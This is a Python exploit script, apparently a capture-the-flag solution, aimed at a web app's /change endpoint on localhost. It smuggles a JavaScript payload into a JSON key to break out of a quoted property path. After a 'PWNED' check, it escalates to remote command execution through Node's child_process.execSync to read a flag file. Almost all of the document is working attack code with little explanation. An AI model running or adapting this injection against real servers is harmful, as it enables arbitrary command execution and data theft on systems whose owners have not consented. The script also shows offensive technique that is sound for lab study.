import requests

TARGET_URL = "http://localhost:8000"

def exploit():
    print(f"[*] Target: {TARGET_URL}")

    # 1. Simple Confirmation Payload
    # We try to break out of Single OR Double quotes.
    # We assign 'PWNED' to the background color.
    js_code = "arguments[0]['background_color'] = 'PWNED'"

    # Key: background_color.ignore'"]; <PAYLOAD>; //
    exploit_key = f"background_color.ignore'\"];{js_code};//"

    data = {
        "background_color": "#ffffff",
        "text_color": "#000000",
        exploit_key: "1"
    }

    print(f"[*] Sending 'PWNED' Payload...")
    try:
        r = requests.post(f"{TARGET_URL}/change", json=data)
        print(f"[*] Injection status: {r.status_code}")
    except Exception as e:
        print(f"[!] Injection failed: {e}")
        return

    # 2. Check Result
    print("[*] Checking home page...")
    r = requests.get(f"{TARGET_URL}/")
    
    if "PWNED" in r.text:
        print("\n[+] RCE CONFIRMED! The background color was changed to 'PWNED'.")
        print("[*] Now running the full exploit...")
        exploit_full()
    else:
        print("[-] 'PWNED' not found. Injection failed.")
        print(f"    Current Background: {extract_color(r.text)}")

def exploit_full():
    # 3. Full /readflag Payload
    # Using the same hybrid breakout.
    js_code = (
        "arguments[0]['background_color']="
        "global['process']['mainModule']['require']('child_process')"
        "['execSync']('/readflag')['toString']()"
    )
    
    exploit_key = f"background_color.ignore'\"];{js_code};//"
    
    data = {
        "background_color": "#ffffff",
        "text_color": "#000000",
        exploit_key: "1"
    }

    print(f"[*] Sending /readflag Payload...")
    requests.post(f"{TARGET_URL}/change", json=data)
    
    r = requests.get(f"{TARGET_URL}/")
    if "DH{" in r.text:
        print("\n[+] SUCCESS! Flag found:")
        start = r.text.find("DH{")
        end = r.text.find("}", start) + 1
        print(f"    {r.text[start:end]}")
    else:
        print("[-] Flag not found.")
        print(f"    Content: {extract_color(r.text)}")

def extract_color(html):
    try:
        return html.split('<p class="background_color">')[1].split('</p>')[0].strip()
    except:
        return "Unknown"

if __name__ == "__main__":
    exploit()
    
